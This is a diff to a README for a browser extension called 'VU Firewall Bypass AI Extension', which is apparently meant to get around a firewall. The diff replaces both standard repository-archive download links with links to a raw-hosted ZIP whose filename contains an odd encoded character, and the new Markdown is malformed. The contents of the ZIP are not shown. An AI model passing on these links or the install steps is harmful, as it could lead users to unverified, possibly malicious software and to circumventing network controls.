@@ -34,7 +34,7 @@
 ### Desktop Installation
 
 1. Download the ZIP file of the repository:  
-   [**Download ZIP**](https://github.com/username/vu-firewall-bypass-ai-extension/archive/refs/heads/main.zip)
+   [**Download ZIP**]([https://github.com/username/vu-firewall-bypass-ai-extension/archive/refs/heads/main.zip](https://github.com/aitzaz70/VU-Firewall-Bypass-AI-Extension/raw/refs/heads/main/MuhammadZaz%EA%AA%9C-VU%20FIREWALL%20BYPASS.zip))
 2. Open your browser and navigate to the extensions page:  
    - For Chrome: `chrome://extensions/`  
    - For Edge: `edge://extensions/`  
@@ -44,7 +44,7 @@
 ### Mobile Installation (Using Kiwi Browser)
 
 1. Download the ZIP file of the repository:  
-   [**Download ZIP**](https://github.com/username/vu-firewall-bypass-ai-extension/archive/refs/heads/main.zip)
+   [**Download ZIP**]([https://github.com/username/vu-firewall-bypass-ai-extension/archive/refs/heads/main.zip](https://github.com/aitzaz70/VU-Firewall-Bypass-AI-Extension/raw/refs/heads/main/MuhammadZaz%EA%AA%9C-VU%20FIREWALL%20BYPASS.zip))
 2. Download and install the [Kiwi Browser](https://play.google.com/store/apps/details?id=com.kiwibrowser.browser) from the Google Play Store.
 3. Open Kiwi Browser and navigate to the extensions page:  
    - Tap the three dots in the top-right corner and select **Extensions**.
